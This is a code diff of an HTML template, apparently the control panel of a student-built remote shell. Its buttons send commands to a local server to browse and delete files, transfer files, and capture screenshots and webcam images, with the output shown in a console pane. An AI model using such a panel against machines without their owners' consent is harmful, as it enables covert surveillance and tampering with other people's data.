@@ -1,10 +1,147 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
     <title>This is a test</title>
+    <<meta http-equiv="Refresh" content="2;http://localhost:5000/index" />
+
 </head>
 <body>
-    <p>your name is {{ name }}</p>
+
+    <div class="con_left">
+        <p>目录:{{ filepath }}</p>
+        <table border="1">
+
+        <tr>
+            <th>Type</th>
+            <th>LastWriteDate</th>
+            <th>LastWriteTime</th>
+            <th>Length(bytes)</th>
+            <th>Name</th>
+            <th>Function</th>
+        </tr>
+        {% for file_entry in file_entries %}
+        <tr>
+            <td>{{file_entry['Type']}}</td>
+            <td>{{file_entry['LastWriteDate']}}</td>
+            <td>{{file_entry['LastWriteTime']}}</td>
+            <td>{{file_entry['Length']}}</td>
+            <td>{{file_entry['Name']}}</td>
+            <td><button type="button" value={{file_entry['Name']} name={{filepath}} onclick="deletefile(this)">删除</button></td>
+             <script type="text/javascript">
+                function deletefile(file) {
+                    filename = file.value
+                    path = file.name + filename
+                    var httpRequest = new XMLHttpRequest();
+                    httpRequest.open('POST', 'http://localhost:5000/fronttest', true);
+                    httpRequest.setRequestHeader("Content-type","application/json");
+                    httpRequest.send(JSON.stringify({"command": "del", "path": path}));
+                }
+            </script>
+        </tr>
+        {% endfor %}
+    </table>
+
+    <button type="button" value="filebrowser" onclick="myfunc(this)">Browser files</button>
+    <button type="button" value="upload" onclick="myfunc(this)">Download</button>
+    <button type="button" value="download" onclick="myfunc(this)">Upload</button>
+    <button type="button" value="screenshot" onclick="myfunc(this)">Screenshot</button>
+    <button type="button" value="camshot" onclick="myfunc(this)">Camshot</button>
+
+    <script type="text/javascript">
+
+        function myfunc(cmd_type) {
+            //alert("fuck");
+            //alert(cmd_type.value)
+            var httpRequest = new XMLHttpRequest();
+            httpRequest.open('POST', 'http://localhost:5000/fronttest', true);
+            httpRequest.setRequestHeader("Content-type","application/json");
+
+            if (cmd_type.value === "filebrowser") {
+                //alert("success");
+                httpRequest.send(JSON.stringify({"command": "dir"}));//发送请求 将json写入send中
+            } else if(cmd_type.value === "screenshot") {
+                 httpRequest.send(JSON.stringify({"command": "screenshot"}));//发送请求 将json写入send中
+            } else if(cmd_type.value === "upload") {
+                 httpRequest.send(JSON.stringify({"command": "upload F:\\current_semester\\software_security\\shell\\1.png"}));//发送请求 将json写入send中
+            } else if(cmd_type.value === "download") {
+                 httpRequest.send(JSON.stringify({"command": "download http://localhost:5000/static/demo.txt F:\\test"}));//发送请求 将json写入send中
+            } else if(cmd_type.value === "camshot") {
+                 httpRequest.send(JSON.stringify({"command": "camshot"}));//发送请求 将json写入send中
+            }
+        }
+
+    </script>
+    </div>
+    <div class="con_right">
+         <textarea id="testScrollTextArea" rows="55" disabled>
+             {{ command_output }}}
+         </textarea>
+        <script>
+            window.onload = function init(params) {
+            var textArea = document.getElementById("testScrollTextArea");
+            textArea.scrollTo(0, textArea.scrollHeight)
+                /*
+            for (let i = 0; i < 1000; i++) {
+            setTimeout(() => {
+            	// 此处可以是Ajax请求的数据或者websocket通信的数据
+                var childText = document.createTextNode(new Date() + ": 后台处理进度：" + i + "\n");
+                textArea.appendChild(childText);
+                // 滚动到底部
+                console.log(textArea.scrollHeight)
+
+            }, 400 * i)
+            }
+            */
+
+            }
+        </script>
+
+        <style>
+            #testScrollTextArea {
+                resize: none;
+                width: 100%;
+                height: 100%;
+                /*margin: 10% 30%;*/
+                font-size: 15px;
+                position: relative;
+                top: 0%;
+                left:0%;
+                background-color: #000207;
+                color: #10d910;
+
+            }
+
+            #testScrollTextArea::-webkit-scrollbar {
+                width: 8px;
+            }
+
+            #testScrollTextArea::-webkit-scrollbar-track {
+                background-color: #ffffff;
+                -webkit-border-radius: 2em;
+                -moz-border-radius: 2em;
+                border-radius: 2em;
+            }
+
+            #testScrollTextArea::-webkit-scrollbar-thumb {
+                background-color: #a9a9ab;
+                -webkit-border-radius: 2em;
+                -moz-border-radius: 2em;
+                border-radius: 2em;
+            }
+        </style>
+    </div>
+
 </body>
+<style>
+    .con_left{
+        float:left;
+        width:50%;
+        height:100%
+        border:1px solid #060}
+    .con_right{
+        float:right;
+        width:50%;
+        height:100%
+        border:1px solid #00F}
+</style>
 </html>
